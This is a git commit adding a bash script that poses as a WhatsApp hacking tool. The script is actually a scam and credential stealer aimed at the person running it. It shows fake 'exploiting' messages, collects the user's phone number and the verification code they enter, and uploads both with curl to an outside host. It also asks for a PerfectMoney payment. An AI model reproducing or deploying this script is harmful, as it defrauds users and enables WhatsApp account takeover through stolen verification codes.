54a4b9d9ee770852cf09d1ddf298b408cdee89b1
ZidanFahrur <107808695+ZidanFahrur@users.noreply.github.com>
2022-06-21 02:56:04 +0700

    Create whatshack.sh

---
+++ whatshack.sh
@@ -0,0 +1,40 @@
+#!/bin/bash
+clear
+echo "
+<-- HACKER CUPU -->
+####################
+#   Whatsapp Code  # By ./TigerPo
+#     Exploiter    # xxxxxxxxxxxxx@gmail.com
+####################
+Copyright (c) 2018 ./TigerPo HACKER CUPU";
+echo "";
+read -p "Nomer Kamu (+62xxxx)=> " nomer;
+read -p "Nomer Target (+62xxxx) => " target;
+sleep 2
+echo "[+] Syncing Target...";
+sleep 1
+echo "Login  => $nomer";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Exploiting...";
+echo "Nomer => $nomer" >> kontol.html;
+curl -T kontol.html http://apparelworld.org/
+sleep 5;
+echo "[+] Done.";
+echo "Pay For Get Code PerfectMoney : U51642112";
+read -p "Verify Code => " code;
+sleep 2
+echo "[+] Connecting to whatsapp.com...";
+echo "Login => $nomer";
+sleep 0.5
+echo "Code => $code";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Sending Exploit...";
+echo "Code => $code" >> kontol.html;
+curl -T kontol.html http://apparelworld.org/
+sleep 5
+echo "[+] Success Exploited!";
+exit;
